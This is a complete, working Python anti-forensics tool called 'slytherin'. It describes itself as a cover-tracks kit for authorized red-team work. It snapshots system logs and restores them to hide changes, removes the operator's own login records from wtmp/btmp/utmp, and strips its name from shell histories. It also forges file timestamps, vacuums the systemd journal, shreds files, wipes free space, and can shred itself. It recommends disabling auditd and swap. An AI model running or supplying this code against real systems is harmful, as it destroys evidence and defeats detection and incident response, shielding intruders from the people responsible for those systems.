#!/usr/bin/env python3
import argparse
import calendar
import glob
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime

TAG = "[slytherin]"
MAX_SNAP = 64 * 1024 * 1024
UTMP_FAMILY = {"utmp", "wtmp", "btmp"}

SESSION = None

def info(m):
    print(f"{TAG} [+] {m}")

def warn(m):
    print(f"{TAG} [!] {m}")

def die(m):
    print(f"{TAG} [-] {m}")
    sys.exit(1)

def build_paths():
    pats = [
        "/var/log/lastlog", "/var/log/faillog", "/var/log/dmesg", "/var/run/utmp",
        "/var/log/auth*", "/var/log/syslog*", "/var/log/daemon*", "/var/log/kern*",
        "/var/log/messages*", "/var/log/secure*", "/var/log/mail*", "/var/log/maillog*",
        "/var/log/cron*", "/var/log/boot*", "/var/log/mysqld.log*", "/var/log/yum.log*",
        "/var/log/btmp*", "/var/log/wtmp*", "/var/log/utmp*",
        "/var/log/audit/*.log*", "/var/log/httpd/*", "/var/log/lighttpd/*",
        "/var/log/ufw*",
        "/var/log/apt/history.log*", "/var/log/apt/term.log*", "/var/log/dpkg.log*",
        "/var/log/aptitude*", "/var/log/eipp.log*",
        "/var/log/apache2/*", "/var/log/mysql/*", "/var/log/mariadb/*",
        "/opt/lampp/logs/*", "/opt/lampp/var/mysql/*.err",
        "/var/log/anydesk*", "/var/log/anydesk/*",
        "/home/*/.anydesk/*", "/root/.anydesk/*",
        "/home/*/.local/share/recently-used.xbel", "/root/.local/share/recently-used.xbel",
        "/home/*/.local/share/gnome-shell/*", "/root/.local/share/gnome-shell/*",
        "/run/mount/utab",
        "~/.bash_history", "~/.zsh_history", "~/.sh_history", "~/.python_history",
        "~/.node_repl_history", "~/.mysql_history", "~/.lesshst", "~/.viminfo",
        "~/.ssh/known_hosts*",
    ]
    hist = [".bash_history", ".zsh_history", ".sh_history", ".python_history",
            ".node_repl_history", ".mysql_history", ".lesshst", ".viminfo"]
    for home in glob.glob("/home/*") + ["/root"]:
        pats += [os.path.join(home, h) for h in hist]
        pats.append(os.path.join(home, ".ssh/known_hosts*"))
    seen, paths = set(), []
    for pat in pats:
        for m in glob.glob(os.path.expanduser(pat)):
            if os.path.isfile(m) and m not in seen:
                seen.add(m)
                paths.append(m)
    return paths

def _session_dir():
    return os.path.join(tempfile.gettempdir(), f".slytherin-{os.getuid()}")

def _meta_path():
    return os.path.join(SESSION, "meta.json")

def _load_meta():
    if not os.path.exists(_meta_path()):
        return {"files": {}, "start": time.time_ns()}
    with open(_meta_path()) as f:
        return json.load(f)

def _save_meta(meta):
    with open(_meta_path(), "w") as f:
        json.dump(meta, f)

def _snap_one(meta, path):
    st = os.stat(path)
    if st.st_size > MAX_SNAP:
        warn(f"skipped (>{MAX_SNAP // (1024 * 1024)}MB): {path}")
        return
    key = f"{len(meta['files']):08x}-{os.path.basename(path)}"
    shutil.copy2(path, os.path.join(SESSION, key))
    meta["files"][os.path.abspath(path)] = {
        "k": key,
        "atime": st.st_atime_ns,
        "mtime": st.st_mtime_ns,
    }

def snap(paths):
    os.makedirs(SESSION, mode=0o700, exist_ok=True)
    meta = _load_meta()
    n = 0
    for p in paths:
        if os.path.abspath(p) in meta["files"]:
            continue
        if not os.path.isfile(p) or not os.access(p, os.R_OK):
            continue
        try:
            _snap_one(meta, p)
            n += 1
        except OSError as e:
            warn(f"cannot snapshot {p}: {e}")
    _save_meta(meta)
    return n

def restore(paths=None, skip=None):
    meta = _load_meta()
    items = meta["files"]
    if paths is not None:
        want = {os.path.abspath(p) for p in paths}
        items = {k: v for k, v in items.items() if k in want}
    if skip:
        items = {k: v for k, v in items.items() if k not in skip}
    n = 0
    for path, rec in items.items():
        blob = os.path.join(SESSION, rec["k"])
        try:
            if os.path.exists(blob):
                with open(blob, "rb") as f:
                    data = f.read()
                with open(path, "wb") as f:
                    f.write(data)
            if os.path.exists(path):
                os.utime(path, ns=(rec["atime"], rec["mtime"]))
            n += 1
        except OSError as e:
            warn(f"cannot restore {path}: {e}")
    return n

def _pkgbase_path():
    return os.path.join(SESSION, "pkgbase")

def _parse_dpkg_list(text):
    pkgs = set()
    for line in text.splitlines():
        name, _, abbrev = line.partition("\t")
        if name and abbrev.startswith("ii"):
            pkgs.add(name)
    return pkgs

def _dpkg_installed():
    r = subprocess.run(
        ["dpkg-query", "-W", "-f=${binary:Package}\t${db:Status-Abbrev}\n"],
        capture_output=True, text=True, timeout=120)
    r.check_returncode()
    return _parse_dpkg_list(r.stdout)

def _warn_pkg_leftovers():
    if not os.path.isfile(_pkgbase_path()) or shutil.which("dpkg-query") is None:
        return
    try:
        with open(_pkgbase_path()) as f:
            baseline = {l.strip() for l in f if l.strip()}
        new = _dpkg_installed() - baseline
        if new:
            warn(f"{len(new)} package(s) installed during this session are still installed - "
                 "review with 'slytherin pkg', purge with 'slytherin pkg --remove'")
    except (OSError, subprocess.SubprocessError):
        pass

def _is_our_record(fields, since_ns, user, tty):
    ts = None
    for f in fields:
        m = re.search(
            r"(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2}:\d{2})(?:[,.]\d+)?\s*([+-]\d{2}:?\d{2})?", f)
        if m:
            try:
                epoch = calendar.timegm(
                    time.strptime(m.group(1) + " " + m.group(2), "%Y-%m-%d %H:%M:%S"))
                if m.group(3):
                    off = m.group(3)[1:].replace(":", "")
                    delta = int(off[:2]) * 3600 + int(off[2:] or 0) * 60
                    epoch += -delta if m.group(3)[0] == "+" else delta
                ts = epoch * 10 ** 9
            except ValueError:
                ts = None
            break
    if ts is None or ts < since_ns:
        return False
    return user in fields or (bool(tty) and tty in fields)

def strip_login_records(meta):
    since = meta.get("start", 0)
    if since <= 0 or shutil.which("utmpdump") is None:
        return 0, []
    try:
        import pwd
        user = pwd.getpwuid(os.getuid()).pw_name
    except (KeyError, ImportError):
        user = ""
    try:
        tty = os.path.basename(os.ttyname(0))
    except OSError:
        tty = ""
    handled, total = [], 0
    for path, rec in meta["files"].items():
        if os.path.basename(path) not in UTMP_FAMILY or not os.path.exists(path):
            continue
        try:
            r = subprocess.run(["utmpdump", path], capture_output=True, timeout=10)
            lines = r.stdout.decode(errors="replace").splitlines()
            keep = [l for l in lines
                    if not _is_our_record(re.findall(r"\[([^\]]*)\]", l), since, user, tty)]
            if len(keep) == len(lines):
                os.utime(path, ns=(rec["atime"], rec["mtime"]))
                handled.append(path)
                continue
            with open(path, "wb") as out:
                w = subprocess.run(["utmpdump", "-r"], input=("\n".join(keep) + "\n").encode(),
                                   stdout=out, capture_output=True, timeout=10)
            if w.returncode != 0:
                raise OSError(w.stderr.decode(errors="replace")[:120])
            os.utime(path, ns=(rec["atime"], rec["mtime"]))
            handled.append(path)
            total += len(lines) - len(keep)
        except Exception:
            restore([path])
    return total, handled

def strip_self():
    changed = 0
    for p in build_paths():
        if not p.endswith("history"):
            continue
        if not os.access(p, os.W_OK):
            continue
        with open(p, errors="replace") as f:
            lines = f.readlines()
        keep = [l for l in lines if "slytherin" not in l.lower()]
        if len(keep) != len(lines):
            with open(p, "w") as f:
                f.writelines(keep)
            changed += len(lines) - len(keep)
    return changed

def nuke_session():
    if not os.path.isdir(SESSION):
        return
    for root, _, files in os.walk(SESSION):
        for fn in files:
            fp = os.path.join(root, fn)
            try:
                size = os.path.getsize(fp)
                with open(fp, "wb") as f:
                    f.write(os.urandom(size))
            except OSError:
                pass
    shutil.rmtree(SESSION, ignore_errors=True)

def cmd_start(args):
    if os.path.isdir(SESSION):
        warn(f"session already exists at {SESSION} (run 'finish' first, or 'finish --discard')")
        return
    n = snap(build_paths())
    info(f"session started: snapshot of {n} files in {SESSION}")
    if shutil.which("dpkg-query"):
        try:
            pkgs = _dpkg_installed()
            with open(_pkgbase_path(), "w") as f:
                f.write("\n".join(sorted(pkgs)) + "\n")
            info(f"package baseline recorded: {len(pkgs)} installed (for 'pkg' tracking)")
        except (OSError, subprocess.SubprocessError) as e:
            warn(f"package baseline failed - 'pkg' tracking unavailable this session: {e}")
    else:
        warn("dpkg-query not found - 'pkg' package tracking unavailable (non-Debian box?)")
    warn("actions taken by OTHER processes during this session will be reverted too "
         "(utmp/wtmp/btmp are surgically stripped instead)")

def cmd_get(args):
    _require_session()
    n = snap([args.path])
    if n:
        info(f"recorded pre-state of {args.path} for revert at finish")
    else:
        warn(f"nothing recorded for {args.path} (missing, or already in session)")

def cmd_finish(args):
    _require_session()
    meta = _load_meta()
    if args.discard:
        nuke_session()
        info("session discarded without restoring")
        return
    stripped, handled = strip_login_records(meta)
    if handled:
        info(f"surgically removed {stripped} login record(s) from: "
             + ", ".join(os.path.basename(p) for p in handled))
    n = restore(skip=set(handled))
    _warn_pkg_leftovers()
    s = strip_self()
    nuke_session()
    info(f"restored {n} files to pre-session state, stripped {s} history line(s)")
    if os.path.isdir("/run/log/journal") or os.path.isdir("/var/log/journal"):
        warn("journald detected - the binary journal is NOT snapshotted; "
             "run 'slytherin journald --vacuum 1s' if you need it trimmed")
    warn("the current shell will still append its buffered history on exit - "
         "run 'history -c && unset HISTFILE' before closing")
    if args.selfdestruct:
        me = os.path.abspath(sys.argv[0])
        if os.path.isfile(me):
            shred(me, 3, True)
            info(f"self-destructed: {me}")

def _require_session():
    if not os.path.isdir(SESSION):
        die(f"no session found at {SESSION} - run 'slytherin start' first")

def cmd_pkg(args):
    _require_session()
    if shutil.which("dpkg-query") is None:
        die("dpkg-query not found - dpkg package tracking unavailable")
    if not os.path.isfile(_pkgbase_path()):
        die("no package baseline in this session (it is recorded at 'start')")
    with open(_pkgbase_path()) as f:
        baseline = {l.strip() for l in f if l.strip()}
    try:
        new = sorted(_dpkg_installed() - baseline)
    except (OSError, subprocess.SubprocessError) as e:
        die(f"cannot query dpkg: {e}")
    if not new:
        info("no packages installed during this session")
        return
    if args.print_cmds:
        print(f"apt-get purge -y {' '.join(new)}")
        return
    for p in new:
        print(f"  {p}")
    if args.remove:
        if shutil.which("apt-get"):
            cmd = ["apt-get", "purge", "-y"]
        else:
            cmd = ["dpkg", "--purge"]
        env = {**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
        r = subprocess.run([*cmd, *new], check=False, env=env)
        if r.returncode == 0:
            info(f"purged {len(new)} session package(s) (deps included - they were session-installed too)")
        else:
            warn(f"remover exited {r.returncode} - some may remain; review with 'pkg --print'")
    else:
        info(f"{len(new)} package(s) installed during session - "
             "'pkg --print' shows the purge command, 'pkg --remove' purges them")

def cmd_status(args):
    rows, w = [], 0
    for p in build_paths():
        try:
            st = os.stat(p)
            writable = os.access(p, os.W_OK)
            rows.append((p, st.st_size, "rw" if writable else "ro"))
            w += writable
        except OSError:
            rows.append((p, None, "gone"))
    for p, size, flag in rows:
        size = f"{size:,} B" if size is not None else "-"
        print(f"  {flag:3} {size:>12}  {p}")
    print(f"\n  {len(rows)} trace file(s) found, {w} writable as current user")
    print("  dry-run only - nothing was modified\n")
    if shutil.which("pidof"):
        r = subprocess.run(["pidof", "auditd"], capture_output=True, text=True)
        if r.returncode == 0:
            warn(f"auditd is RUNNING (pid {r.stdout.strip()}) - kernel audit rules see everything; "
                 "consider 'auditctl -e 0' before acting")
    if os.path.isdir("/run/log/journal") or os.path.isdir("/var/log/journal"):
        info("journald detected - 'journald --vacuum' can trim the binary journal")
    try:
        with open("/proc/swaps") as f:
            lines = f.read().strip().splitlines()
        if len(lines) > 1:
            warn("swap is ACTIVE - memory fragments (keys, history) hit disk; "
                 "'swapoff -a' during the session, re-enable after")
    except OSError:
        pass
    if shutil.which("utmpdump"):
        info("utmpdump available - finish surgically strips login records")
    else:
        warn("utmpdump missing - login-record cleanup falls back to full revert")

def shred(path, iters, zero, keep=False):
    st = os.stat(path)
    size = st.st_size
    with open(path, "r+b") as f:
        for i in range(iters):
            f.seek(0)
            left = size
            while left > 0:
                chunk = os.urandom(min(1024 * 1024, left))
                f.write(chunk)
                left -= len(chunk)
            f.flush()
            os.fsync(f.fileno())
            try:
                os.posix_fadvise(f.fileno(), 0, 0, os.POSIX_FADV_DONTNEED)
            except (AttributeError, OSError):
                pass
        if zero:
            f.seek(0)
            left = size
            while left > 0:
                chunk = b"\x00" * min(1024 * 1024, left)
                f.write(chunk)
                left -= len(chunk)
            f.flush()
            os.fsync(f.fileno())
    if not keep:
        tmpname = os.path.join(os.path.dirname(path) or ".", f".sly-{os.urandom(8).hex()}")
        os.rename(path, tmpname)
        os.remove(tmpname)
    return size

def cmd_shred(args):
    total = 0
    for p in args.paths:
        for f in sorted(glob.glob(os.path.expanduser(p))) or ([p] if os.path.exists(p) else []):
            if not os.path.isfile(f):
                continue
            try:
                total += shred(f, args.iterations, args.zero, args.keep)
                info(f"shredded ({args.iterations}x{'+zero' if args.zero else ''}): {f}"
                     if not args.keep else f"overwrote in place (--keep): {f}")
            except OSError as e:
                warn(f"cannot shred {f}: {e}")
    info(f"{total:,} bytes overwritten")

def parse_time(s):
    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S"):
        try:
            return int(time.mktime(datetime.strptime(s, fmt).timetuple()))
        except ValueError:
            pass
    die(f"unparseable time '{s}' - use 'YYYY-MM-DD HH:MM:SS'")

def cmd_mace(args):
    targets = []
    for p in args.paths:
        found = sorted(glob.glob(os.path.expanduser(p))) or [p]
        for f in found:
            if os.path.isfile(f) or (os.path.isdir(f) and args.recurse):
                targets.append(f)
            elif os.path.isdir(f):
                warn(f"dir without --recurse skipped: {f}")
    if args.recurse:
        expanded = []
        for t in targets:
            if os.path.isdir(t):
                for root, _, files in os.walk(t):
                    expanded += [os.path.join(root, x) for x in files]
            else:
                expanded.append(t)
        targets = expanded
    if args.view:
        for t in targets:
            st = os.stat(t)
            print(f"  {t}\n    Modified : {time.ctime(st.st_mtime)}\n"
                  f"    Accessed : {time.ctime(st.st_atime)}\n"
                  f"    Changed  : {time.ctime(st.st_ctime)}")
        return
    if args.donor and args.time:
        die("--time and --from are mutually exclusive")
    if args.donor:
        dst = os.stat(os.path.expanduser(args.donor))
        stamps = [(dst.st_atime_ns, dst.st_mtime_ns)] * len(targets)
        label = f"donor {args.donor}"
    elif args.time:
        ns = parse_time(args.time) * 10 ** 9
        stamps = [(ns, ns)] * len(targets)
        label = args.time
    else:
        die("provide --time 'YYYY-MM-DD HH:MM:SS', --from <donor>, or --view")
    n = 0
    for t, (a, m) in zip(targets, stamps):
        try:
            os.utime(t, ns=(a, m))
            warn(f"ctime not userspace-settable - for ctime on ext4 use: "
                 f"debugfs -w -R \"set_inode_field <path> ctime <value>\" <dev>")
            n += 1
        except OSError as e:
            warn(f"cannot stamp {t}: {e}")
    info(f"stamped {n} file(s) -> {label}")

def cmd_journald(args):
    if shutil.which("journalctl") is None:
        die("journalctl not found - systemd-journald not present")
    subprocess.run(["journalctl", "--rotate"], check=False)
    r = subprocess.run(["journalctl", f"--vacuum-time={args.vacuum}"],
                       capture_output=True, text=True, check=False)
    sys.stdout.write(r.stdout)
    info(f"journald trimmed: rotated + vacuum-time={args.vacuum}")
    warn("vacuum trims the LOCAL journal only - anything already forwarded to a SIEM is unaffected")

def cmd_changed(args):
    _require_session()
    meta = _load_meta()
    since_ns = meta.get("start", 0)
    if since_ns <= 0:
        die("session has no start timestamp")
    dirs = args.dir or ["/etc", "/opt", "/srv", "/var/www", "/root", "/home"]
    n = 0
    for d in dirs:
        for root, _, files in os.walk(d):
            for fn in files:
                fp = os.path.join(root, fn)
                try:
                    st = os.lstat(fp)
                except OSError:
                    continue
                if st.st_mtime_ns >= since_ns or st.st_ctime_ns >= since_ns:
                    print(f"  {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(st.st_mtime / 1e9))}  {fp}")
                    n += 1
    info(f"{n} file(s) changed since session start - 'get' + revert or 'mace' each before finish")

def cmd_free(args):
    d = args.dir or tempfile.gettempdir()
    cap = args.mb * 1024 * 1024 if args.mb else None
    fn = os.path.join(d, f".slytherin-wipe-{os.getpid()}")
    written = 0
    try:
        with open(fn, "wb") as f:
            while True:
                try:
                    f.write(os.urandom(4 * 1024 * 1024))
                    written += 4 * 1024 * 1024
                except OSError:
                    break
                if cap and written >= cap:
                    break
            f.flush()
            os.fsync(f.fileno())
    finally:
        try:
            os.remove(fn)
        except OSError:
            pass
    info(f"free-space wipe: {written:,} bytes overwritten in {d}")
    warn("defeats naive recovery only - SSD wear-leveling keeps remnants")

def cmd_selftest(args):
    tmp = tempfile.mkdtemp(prefix="slytherin-test-")
    global SESSION
    old_session = SESSION
    SESSION = os.path.join(tmp, ".sess")
    try:
        a = os.path.join(tmp, "auth.log")
        b = os.path.join(tmp, "wtmp")
        open(a, "w").write("line1\n")
        open(b, "w").write("wb\n")
        old = int(time.time()) - 86400 * 30
        for f in (a, b):
            os.utime(f, ns=(old * 10 ** 9, old * 10 ** 9))
        assert snap([a, b]) == 2, "snapshot count"
        open(a, "a").write("evil-trace\n")
        os.utime(a, ns=(0, 0))
        assert restore([a, b]) == 2, "restore count"
        assert open(a).read() == "line1\n", "content restore failed"
        assert open(b).read() == "wb\n", "content restore failed (b)"
        assert os.stat(a).st_mtime_ns == old * 10 ** 9, "mtime restore failed"
        c = os.path.join(tmp, "shredme")
        open(c, "w").write("x" * 100)
        shred(c, 2, True)
        assert not os.path.exists(c), "shred failed"
        assert not any(x.startswith(".sly-") for x in os.listdir(tmp)), "shred left renamed file"
        since = 1735689600 * 10 ** 9
        ours = "[7] [1234] [pts/2] [ts/2] [root] [10.0.0.1] [2025-01-02T10:00:00,000000+00:00]"
        other = "[7] [9999] [pts/3] [ts/3] [alice] [10.0.0.2] [2025-01-02T11:00:00,000000+00:00]"
        older = "[7] [1111] [pts/1] [ts/1] [root] [10.0.0.1] [2024-12-31T10:00:00,000000+00:00]"
        bad = "[7] [2222] [pts/4] [ts/4] [root] [not-a-date]"
        assert _is_our_record(re.findall(r"\[([^\]]*)\]", ours), since, "root", "pts/2"), "own record"
        assert not _is_our_record(re.findall(r"\[([^\]]*)\]", other), since, "root", "pts/2"), "other user kept"
        assert not _is_our_record(re.findall(r"\[([^\]]*)\]", older), since, "root", "pts/2"), "pre-session kept"
        assert not _is_our_record(re.findall(r"\[([^\]]*)\]", bad), since, "root", "pts/2"), "unparseable kept"
        dl = "libc6:amd64\tii \nremoved\trc \nhalf\thi \napt\tii \nunpack\tiU \n"
        assert _parse_dpkg_list(dl) == {"libc6:amd64", "apt"}, "dpkg parse"
        nuke_session()
        assert not os.path.isdir(SESSION), "session cleanup failed"
        shutil.rmtree(tmp)
        info("selftest PASS (snapshot/revert, mtime revert, shred+zero+rename, "
             "utmp record filter, dpkg parse, session cleanup)")
    except AssertionError as e:
        shutil.rmtree(tmp, ignore_errors=True)
        SESSION = old_session
        die(f"selftest FAILED: {e}")
    SESSION = old_session

def main():
    global SESSION
    SESSION = _session_dir()
    ap = argparse.ArgumentParser(
        prog="slytherin",
        description="Linux cover-tracks toolkit for authorized red-team operations",
        epilog="Authorized use only. Dry-run first with 'status'. 'start' before acting, 'finish' after.")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("start", help="snapshot logs+timestamps of this session").set_defaults(fn=cmd_start)
    p = sub.add_parser("get", help="record pre-state of one file mid-session")
    p.add_argument("path")
    p.set_defaults(fn=cmd_get)
    p = sub.add_parser("finish", help="revert logs+timestamps, strip history, remove session")
    p.add_argument("--discard", action="store_true", help="shred session without restoring")
    p.add_argument("--selfdestruct", action="store_true",
                   help="shred the slytherin binary itself after finishing")
    p.set_defaults(fn=cmd_finish)
    sub.add_parser("status", help="dry-run: list trace files, writability + environment intel") \
        .set_defaults(fn=cmd_status)

    p = sub.add_parser("shred", help="random-overwrite files N times, rename, then unlink")
    p.add_argument("paths", nargs="+")
    p.add_argument("-n", "--iterations", type=int, default=3)
    p.add_argument("-z", "--zero", action="store_true", help="final zero pass")
    p.add_argument("--keep", action="store_true", help="overwrite in place, do not unlink")
    p.set_defaults(fn=cmd_shred)

    p = sub.add_parser("mace", help="rewrite timestamps (atime/mtime; ctime needs debugfs)")
    p.add_argument("paths", nargs="+")
    p.add_argument("-t", "--time", help="'YYYY-MM-DD HH:MM:SS'")
    p.add_argument("--from", dest="donor", metavar="DONOR",
                   help="clone timestamps from a donor file (blend in with siblings)")
    p.add_argument("-r", "--recurse", action="store_true")
    p.add_argument("-v", "--view", action="store_true", help="show current timestamps")
    p.set_defaults(fn=cmd_mace)

    p = sub.add_parser("journald", help="trim the systemd binary journal (rotate + vacuum)")
    p.add_argument("--vacuum", default="1s", metavar="TIME",
                   help="keep entries newer than this (default: 1s)")
    p.set_defaults(fn=cmd_journald)

    p = sub.add_parser("pkg", help="packages installed during this session (dpkg)")
    p.add_argument("--print", dest="print_cmds", action="store_true",
                   help="just print the purge command for review")
    p.add_argument("--remove", action="store_true",
                   help="purge everything the session installed, deps included")
    p.set_defaults(fn=cmd_pkg)

    p = sub.add_parser("changed", help="list files modified since session start")
    p.add_argument("--dir", nargs="*", metavar="DIR",
                   help="dirs to scan (default: /etc /opt /srv /var/www /root /home)")
    p.set_defaults(fn=cmd_changed)

    p = sub.add_parser("free", help="overwrite unallocated space")
    p.add_argument("--dir")
    p.add_argument("--mb", type=int, help="cap wipe size (default: fill disk)")
    p.set_defaults(fn=cmd_free)

    sub.add_parser("selftest", help="run built-in verification").set_defaults(fn=cmd_selftest)

    args = ap.parse_args()
    args.fn(args)

if __name__ == "__main__":
    main()
